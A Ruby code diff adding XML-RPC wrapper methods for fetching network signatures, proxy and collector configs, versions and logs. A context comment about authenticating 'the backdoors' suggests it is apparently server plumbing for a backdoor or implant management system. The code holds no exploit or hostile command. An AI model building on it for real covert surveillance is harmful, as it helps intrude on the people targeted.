@@ -123,6 +123,16 @@ class DB_xmlrpc
     end
   end
 
+  # network signature for NC
+  def network_signature
+    begin
+      return xmlrpc_call('sign.get', "network")
+    rescue Exception => e
+      trace :error, "Error calling sign.get: #{e.class} #{e.message}"
+      propagate_error e
+    end
+  end
+
   # used to authenticate the backdoors
   def class_keys(build_id = '')
     begin
@@ -344,6 +354,86 @@ class DB_xmlrpc
       xmlrpc_call('filesystem.del', id)
     rescue Exception => e
       trace :error, "Error calling filesystem.del: #{e.class} #{e.message}"
+      propagate_error e
+    end
+  end
+
+  def get_proxies
+    begin
+      xmlrpc_call('proxy.get', 0)
+    rescue Exception => e
+      trace :error, "Error calling proxy.get: #{e.class} #{e.message}"
+      propagate_error e
+    end
+  end
+
+  def get_collectors
+    begin
+      xmlrpc_call('collector.get', 0)
+    rescue Exception => e
+      trace :error, "Error calling collector.get: #{e.class} #{e.message}"
+      propagate_error e
+    end
+  end
+
+  def proxy_set_version(id, version)
+    begin
+      xmlrpc_call('proxy.setversion', id, version)
+    rescue Exception => e
+      trace :error, "Error calling proxy.setversion: #{e.class} #{e.message}"
+      propagate_error e
+    end
+  end
+
+  def collector_set_version(id, version)
+    begin
+      xmlrpc_call('collector.setversion', id, version)
+    rescue Exception => e
+      trace :error, "Error calling collector.setversion: #{e.class} #{e.message}"
+      propagate_error e
+    end
+  end
+
+  def proxy_get_config(id)
+    begin
+      # retrieve the file from the db
+      config = get_file :resource => 'proxy', :proxy_id => id
+      # set the config as sent
+      xmlrpc_call('proxy.setstatus', id, 0)
+      return config
+    rescue Exception => e
+      trace :error, "Error calling proxy get config: #{e.class} #{e.message}"
+      propagate_error e
+    end
+  end
+
+  def collector_get_config(id)
+    begin
+      # retrieve the file from the db
+      config = get_file :resource => 'collector', :collector_id => id
+      # set the config as sent
+      xmlrpc_call('collector.setstatus', id, 0)
+      return config
+    rescue Exception => e
+      trace :error, "Error calling collector get config: #{e.class} #{e.message}"
+      propagate_error e
+    end
+  end
+
+  def proxy_add_log(id, time, type, desc)
+    begin
+      xmlrpc_call('proxy.addlog', id, time, type, desc)
+    rescue Exception => e
+      trace :error, "Error calling proxy.addlog: #{e.class} #{e.message}"
+      propagate_error e
+    end
+  end
+
+  def collector_add_log(id, time, type, desc)
+    begin
+      xmlrpc_call('collector.addlog', id, time, type, desc)
+    rescue Exception => e
+      trace :error, "Error calling collector.addlog: #{e.class} #{e.message}"
       propagate_error e
     end
   end
